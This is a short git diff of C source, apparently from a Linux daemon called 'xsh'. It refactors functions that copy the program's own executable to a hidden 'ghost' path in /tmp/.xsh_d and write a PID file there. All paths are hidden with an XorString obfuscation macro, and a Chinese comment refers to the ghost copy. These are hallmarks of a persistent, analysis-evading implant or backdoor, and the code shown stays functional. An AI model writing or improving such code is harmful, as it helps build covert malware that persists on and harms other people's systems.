@@ -104,12 +104,17 @@ void init_deamon()
  */
 static void backup_self()
 {
-    mkdir(XorString("/tmp/.xsh_d"), 0755);
+    char dir_path[64], ghost_path[64], proc_exe[64];
+    strncpy(dir_path, XorString("/tmp/.xsh_d"), sizeof(dir_path));
+    strncpy(ghost_path, XorString(GHOST_PATH), sizeof(ghost_path));
+    strncpy(proc_exe, XorString("/proc/self/exe"), sizeof(proc_exe));
+
+    mkdir(dir_path, 0755);
 
     char buf[4096];
-    int src = open(XorString("/proc/self/exe"), O_RDONLY);
+    int src = open(proc_exe, O_RDONLY);
     if (src < 0) return;
-    int dst = open(XorString(GHOST_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    int dst = open(ghost_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
     if (dst < 0) { close(src); return; }
     int n;
     while ((n = read(src, buf, sizeof(buf))) > 0)
@@ -125,10 +130,14 @@ static void backup_self()
  */
 static void write_pid_file()
 {
-    mkdir(XorString("/tmp/.xsh_d"), 0755); /* 确保目录存在（ghost 跳过了 backup_self） */
+    char dir_path[64], pid_path[64];
+    strncpy(dir_path, XorString("/tmp/.xsh_d"), sizeof(dir_path));
+    strncpy(pid_path, XorString(PID_FILE), sizeof(pid_path));
+
+    mkdir(dir_path, 0755); /* 确保目录存在（ghost 跳过了 backup_self） */
     char buf[32];
     int n = snprintf(buf, sizeof(buf), "%d", getpid());
-    int fd = open(XorString(PID_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int fd = open(pid_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd >= 0)
     {
         write(fd, buf, n);
